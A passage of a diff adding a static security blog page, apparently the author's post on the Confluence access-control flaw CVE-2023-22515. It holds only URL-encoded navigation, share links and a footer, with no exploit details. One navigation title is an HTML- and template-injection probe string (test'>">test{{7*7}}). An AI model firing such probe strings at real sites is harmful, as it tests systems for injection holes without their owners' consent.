%2fCTF%2fcsaw19-ctf%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fCTF%2ftangled_browsers%22%3etangled_browsers%3c%2fa%3e%7b.aJHbb%20.hDrhEe%20.HlqNPb%0ajsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fCTF%2ftangled_browsers%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fCTF%2fbytebandits-ctf-2020%22%3eByteBandits%20CTF%202020%3c%2fa%3e%7b.aJHbb%20.hDrhEe%0a.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fCTF%2fbytebandits-ctf-2020%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fCTF%2fIuseBing%22%3eGoogle%20CTF%20-%202020%3c%2fa%3e%7b.aJHbb%20.hDrhEe%20.HlqNPb%0ajsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fCTF%2fIuseBing%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fCTF%2fzer0ptsctf2021-challenges%22%3ezer0ptsCTF2021-challenges%3c%2fa%3e%7b.aJHbb%0a.hDrhEe%20.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%0anavtype%3d%26ldquo%3b1%26rdquo%3b%20url%3d%26quot%3b%2fCTF%2fzer0ptsctf2021-challenges%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%0alevel%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fCTF%2fsite-isolation%22%3esite-isolation%3c%2fa%3e%7b.aJHbb%20.hDrhEe%20.HlqNPb%0ajsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fCTF%2fsite-isolation%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fCTF%2fbsidesahm2021%22%3eBsidesAHM2021%3c%2fa%3e%7b.aJHbb%20.hDrhEe%20.HlqNPb%0ajsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fCTF%2fbsidesahm2021%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3c%2ful%3e%0a%3c%2fli%3e%0a%3cli%3e%3cimg%20src%3d%22data%3aimage%2fsvg%2bxml%3bbase64%2cPHN2ZyBjbGFzcz0iZHZtUncgRldHaklkIiB2aWV3Ym94PSIwIDAgMjQgMjQiIHN0cm9rZT0iY3VycmVudENvbG9yIiBqc25hbWU9IkhJSDJWIiBmb2N1c2FibGU9ImZhbHNlIj48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSg5LjcsMTIpIHJvdGF0ZSg0NSkiPjxwYXRoIGNsYXNzPSJLNEI4WSIgZD0iTS00LjIgMCBMNC4yIDAiIHN0cm9rZS13aWR0aD0iMiIgLz48L2c%2bPGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTQuMywxMikgcm90YXRlKC00NSkiPjxwYXRoIGNsYXNzPSJNcllNeCIgZD0iTS00LjIgMCBMNC4yIDAiIHN0cm9rZS13aWR0aD0iMiIgLz48L2c%2bPC9zdmc%2b%22%20alt%3d%22%22%3e%7b.dvmRw%0a.FWGjId%7d%0a%3ca%20href%3d%22%2fresearch%22%3eResearch%3c%2fa%3e%7b.aJHbb%20.dk90Ob%20.hDrhEe%20.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%0arole%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%20aria-expanded%3d%26ldquo%3btrue%26rdquo%3b%0aaria-haspopup%3d%26ldquo%3btrue%26rdquo%3b%20url%3d%26quot%3b%2fresearch%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b1%26rdquo%3b%7d%0a%3cul%3e%0a%3cli%3e%3ca%20href%3d%22%2fresearch%2fcookie-tossing-to-rce-on-google-cloud-jupyter-notebooks%22%3eCookie%20Tossing%20to%20RCE%20on%20Google%20Cloud%20Jupyter%0aNotebooks%3c%2fa%3e%7b.aJHbb%0a.hDrhEe%20.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%0anavtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fresearch%2fcookie-tossing-to-rce-on-google-cloud-jupyter-notebooks%26quot%3b%0adata-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fresearch%2ftesttest77%22%3etest%27%26gt%3b%26quot%3b%26gt%3btest%7b%7b7%2a7%7d%7d%3c%2fa%3e%7b.aJHbb%20.hDrhEe%0a.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fresearch%2ftesttest77%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fresearch%2fPP%22%3ePrototype%20Pollution%3c%2fa%3e%7b.aJHbb%20.hDrhEe%20.HlqNPb%0ajsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fresearch%2fPP%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fresearch%2fbrokenconflu%22%3eBrokenConflu%3c%2fa%3e%7b.aJHbb%20.hDrhEe%20.HlqNPb%0ajsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aaria-selected%3d%26ldquo%3btrue%26rdquo%3b%20url%3d%26quot%3b%2fresearch%2fbrokenconflu%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%0alevel%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3c%2ful%3e%0a%3c%2fli%3e%0a%3cli%3e%3cimg%20src%3d%22data%3aimage%2fsvg%2bxml%3bbase64%2cPHN2ZyBjbGFzcz0iZHZtUnciIHZpZXdib3g9IjAgMCAyNCAyNCIgc3Ryb2tlPSJjdXJyZW50Q29sb3IiIGpzbmFtZT0iSElIMlYiIGZvY3VzYWJsZT0iZmFsc2UiPjxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDkuNywxMikgcm90YXRlKDQ1KSI%2bPHBhdGggY2xhc3M9Iks0QjhZIiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNC4zLDEyKSByb3RhdGUoLTQ1KSI%2bPHBhdGggY2xhc3M9Ik1yWU14IiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48L3N2Zz4%3d%22%20alt%3d%22%22%3e%7b.dvmRw%7d%0a%3ca%20href%3d%22%2fabout-me%22%3eAbout%20Me%3c%2fa%3e%7b.aJHbb%20.dk90Ob%20.hDrhEe%20.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%0arole%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%20aria-expanded%3d%26ldquo%3bfalse%26rdquo%3b%0aaria-haspopup%3d%26ldquo%3btrue%26rdquo%3b%20url%3d%26quot%3b%2fabout-me%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b1%26rdquo%3b%7d%0a%3cul%3e%0a%3cli%3e%3ca%20href%3d%22%2fabout-me%2fLooking-Back-Looking-Forward%22%3eLooking%20Back%20Looking%20Forward%3a%0a2021%3c%2fa%3e%7b.aJHbb%20.hDrhEe%0a.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fabout-me%2fLooking-Back-Looking-Forward%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%0alevel%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3c%2ful%3e%0a%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2finspiration%22%3eInspiration%3c%2fa%3e%7b.aJHbb%20.dk90Ob%20.hDrhEe%20.HlqNPb%0ajsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2finspiration%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b1%26rdquo%3b%7d%3c%2fli%3e%0a%3c%2ful%3e%0a%3cp%3e%3ca%20href%3d%22%2fhome%22%3e%3cimg%20src%3d%22https%3a%2f%2flh5.googleusercontent.com%2f-oZZhZc9Pzr-nQYzLLJKOOnQOPilv9vMC45HKARYGOqlI_koFYOw63xvcNn-Dt284RgUCmh-Gy261Ul7XwSwd-A%3dw16383%22%20alt%3d%22%22%3e%7b.lzy1Td%0arole%3d%26ldquo%3bimg%26rdquo%3b%20aria-label%3d%26ldquo%3bSite%20home%26rdquo%3b%20jsname%3d%26ldquo%3bSwcDWb%26rdquo%3b%7ds1r1us%3c%2fa%3e%7b.GAuSPc%0ajsname%3d%26ldquo%3bjIujaf%26rdquo%3b%7d%3c%2fp%3e" aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=%2f%2flocalhost%3a1313%2fposts%2fbroken-conflu%2f&t=CVE-2023-22515%20-%20Broken%20Access%20Control%20Vulnerability%20in%20Confluence%20Data%20Center%20and%20Server" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2024  Copyright © s1r1us 
+    
+      
+    
+      
+      
+      
+        <a class="icon" target="_blank" rel="noopener" href="https://github.com/ElecmsrkptrovoltSec" aria-label="github">
+          <i class="fab fa-github" aria-hidden="true"></i>
+        </a>
+        
+      
+      
+        <a class="icon" target="_blank" rel="noopener" href="mailto:l33tsirius@gmail.com" aria-label="Email">
+          <i class="fas fa-envelope" aria-hidden="true"></i>
+        </a>
+        
+      
+      
+        <a class="icon" target="_blank" rel="noopener" href="https://twitter.com/s1r1u5_" aria-label="twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+        
+      
+      
+    
+  
+  </div>
+  <div class="footer-right">
+    <nav>
+    
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">Posts</a></li>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+<script src=/js/code-copy.js></script>
+
+
+
+
+</html>
